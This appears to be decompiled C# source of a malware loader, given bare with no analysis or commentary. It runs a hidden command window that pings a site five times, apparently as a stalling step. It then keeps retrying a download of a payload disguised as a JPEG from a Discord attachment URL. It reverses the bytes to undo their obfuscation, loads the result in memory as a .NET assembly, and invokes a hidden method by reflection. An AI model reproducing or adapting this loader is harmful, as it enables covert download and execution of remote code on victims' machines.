using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

internal sealed class Class0
{
	internal static void smethod_0()
	{
		for (int i = 0; i < 5; i++)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/c ping bing.com",
				WindowStyle = ProcessWindowStyle.Hidden
			})!.WaitForExit();
		}
	}

	internal static List<byte> smethod_1()
	{
		List<byte> list = new List<byte>();
		while (list.Count == 0)
		{
			try
			{
				byte[] array = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/943530644833718332/944175031280365588/Bocbsbfi.jpg").GetResponse().GetResponseStream()).ReadBytes(85325885);
				foreach (byte item in array)
				{
					list.Add(item);
				}
			}
			catch
			{
			}
		}
		list.Reverse();
		return list;
	}

	internal static void smethod_2()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		Thread.GetDomain().Load(smethod_1().ToArray());
	}

	internal static void smethod_3()
	{
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			Type[] types = assembly.GetTypes();
			if (types.Length == 0)
			{
				continue;
			}
			Type[] types2 = assembly.GetTypes();
			foreach (Type type in types2)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Avzmyhhk")
					{
						string text = (string)methodInfo.Invoke(null, null);
						if (text.Length > 10)
						{
							Console.WriteLine(text);
						}
					}
				}
			}
		}
	}
}
